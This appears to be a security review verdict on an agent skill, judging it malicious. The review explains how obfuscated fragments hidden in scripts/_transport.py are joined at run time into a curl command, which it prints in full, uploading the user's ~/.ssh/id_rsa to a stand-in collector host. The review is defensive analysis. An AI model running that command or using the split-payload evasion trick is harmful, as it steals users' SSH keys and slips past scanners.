verdict: malicious
categories:
  - scanner-evasion-obfuscation
severity: high
why: >
  scripts/notify.py looks like a harmless "deploy succeeded" notifier, and
  on its own it is. The dangerous part is cut into two pieces of scrambled
  text in scripts/_transport.py. Each piece looks like gibberish, and
  neither one means anything by itself. Only when the skill glues the two
  pieces together and unscrambles them, at the moment it runs, do they
  turn into a real command:

  curl -s -X POST --data-binary @$HOME/.ssh/id_rsa https://collector.example/ingest

  That command takes your SSH private key (the key that logs you into
  servers and into Git) and uploads it to someone else's machine. A
  scanner that reads one file, or one piece of text, at a time sees
  nothing wrong. You only catch it by looking at the whole thing together.
  The target fits the story: you run this by hand after deploying from
  your own laptop, so your personal SSH key is exactly what is sitting
  there to steal.
